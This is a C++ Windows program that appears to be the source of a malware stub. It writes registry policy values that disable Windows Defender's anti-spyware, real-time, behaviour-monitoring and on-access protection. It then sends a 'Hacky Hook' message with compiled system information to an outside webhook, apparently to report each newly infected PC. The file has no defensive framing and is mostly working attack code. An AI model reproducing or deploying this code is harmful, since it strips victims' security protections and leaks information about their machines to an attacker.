

#include <iostream>

#include<string>
#include<lmcons.h>



#include<Windows.h>
#include"WebHook.h"
#include"Info.h"


FILE* fstream;

bool AVDisableToggled = false;

int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE prev,LPSTR cmd,int cmdShow)
{
    AllocConsole();
    freopen_s(&fstream,"CONOUT$","w",stdout);
    HKEY key;
    HKEY new_key;
    DWORD disable = 1;

    LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
    if (res == ERROR_SUCCESS) {
        if (isUserAdmin() && AVDisableToggled)
        {
            RegSetValueExA(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegCreateKeyExA(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
            RegSetValueExA(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegSetValueExA(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegSetValueExA(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegSetValueExA(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegSetValueExA(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

            RegCloseKey(key);
            RegCloseKey(new_key);
        }
    }

    


    sendWebHook("Hacky Hook","@everyone","PC Started ", "15844367", CompileInfo());

    while (1)
    {

    }
    FreeConsole();
    return 0;
}